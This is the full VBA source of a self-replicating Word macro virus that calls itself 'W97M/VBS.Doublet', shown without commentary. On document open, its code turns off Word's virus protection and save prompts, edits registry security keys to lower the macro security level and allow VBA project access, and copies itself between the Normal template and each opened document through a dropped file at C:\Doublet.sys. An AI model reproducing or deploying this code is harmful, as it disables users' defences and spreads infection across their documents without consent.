Attribute VB_Name = "Doublet"
Sub AutoOpen()
On Error Resume Next
Call FuckProtect
Call Infect
End Sub

Sub HelpAbout()
If Day(Now) = 10 Then
MsgBox "W97M/VBS.Doublet. Hahahahaha", vbInformation, "For " + Application.UserName
End If
End Sub

Sub Infect()
On Error Resume Next
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
Drop = "C:\Doublet.sys"
If Nor.Item("Doublet").Name <> "Doublet" Then
    Doc("Doublet").Export Drop
    Nor.Import Drop
End If
If Doc.Item("Doublet").Name <> "Doublet" Then
    Nor("Doublet").Export Drop
    Doc.Import Drop
    ActiveDocument.Save
End If
End Sub

Sub FuckProtect()
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
End Sub
